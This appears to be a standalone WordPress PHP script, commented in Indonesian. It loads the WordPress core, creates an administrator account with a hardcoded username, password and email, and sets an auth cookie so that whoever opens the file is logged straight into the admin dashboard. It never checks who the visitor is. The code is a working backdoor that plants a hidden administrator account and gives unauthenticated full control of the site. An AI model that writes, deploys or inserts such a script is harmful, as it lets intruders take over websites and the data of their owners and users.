<?php
// Pastikan file ini dijalankan di dalam konteks WordPress
require_once('wp-load.php');

// Informasi pengguna
$username = 'admin1001'; // Ganti dengan username yang diinginkan
$password = 'jacknicklaus'; // Ganti dengan password yang diinginkan
$email = 'abcqwerty883@gmail.com'; // Ganti dengan email yang diinginkan

// Cek apakah username sudah ada
if (username_exists($username) == null && email_exists($email) == false) {
    // Buat pengguna baru
    $user_id = wp_create_user($username, $password, $email);

    if (!is_wp_error($user_id)) {
        // Set peran sebagai administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        echo "Pengguna administrator baru berhasil dibuat. Anda akan diarahkan untuk login otomatis.";

        // Login otomatis
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        wp_redirect(admin_url()); // Arahkan ke dashboard admin
        exit;
    } else {
        echo "Gagal membuat pengguna: " . $user_id->get_error_message();
    }
} else {
    // Pengguna sudah ada, lakukan login otomatis
    $user = get_user_by('login', $username);

    if ($user) {
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_redirect(admin_url()); // Arahkan ke dashboard admin
        exit;
    } else {
        echo "Pengguna tidak ditemukan.";
    }
}
?>